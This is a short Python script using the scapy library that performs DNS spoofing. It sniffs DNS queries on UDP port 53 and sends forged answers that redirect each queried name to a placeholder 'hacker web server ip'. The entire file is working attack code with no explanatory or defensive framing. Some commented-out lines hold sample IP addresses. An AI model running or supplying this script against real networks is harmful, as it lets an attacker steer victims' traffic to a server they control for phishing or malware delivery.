from scapy.all import *

def dnsSpoof(packet):
    spoofDNS = '[hacker web server ip]'
    dstip = packet[IP].src
    #print("dst ip = {} (packet[IP].src)".format(dstip))
    srcip = packet[IP].dst
    #print("src ip = {} (packet[IP].dst)".format(srcip))
    dport = packet[UDP].sport
    #print("dport ip = {} (packet[IP].src)".format(dport))
    sport = packet[UDP].dport
    #print("sport ip = {} (packet[IP].src)".format(sport))
    #srcip = '219.250.36.130'
    #dstip = '192.168.0.20'
    qname = packet[DNSQR].qname
    if  packet.haslayer(DNSQR):
        dnsid = packet[DNS].id
        qd = packet[DNS].qd
        dnsrr = DNSRR(rrname=qname, ttl = 2, rdata=spoofDNS)
        spoofPacket = IP(dst = dstip, src= srcip)/UDP(dport=sport, sport=dport)/DNS(id=dnsid, qd=qd, aa=2, qr=1, an=dnsrr)
        send(spoofPacket)
        print(spoofPacket.summary())
        print(qname)
        
    else:
        print("hasn't layer DNSQR, it go to original dst")
        print("qname : ", qname)
        #send(packet)
def main():
    print("+++ DNS SPOOF START .....")
    sniff(filter='udp port 53', store=0, prn=dnsSpoof)
    
if __name__ == '__main__':
    main()
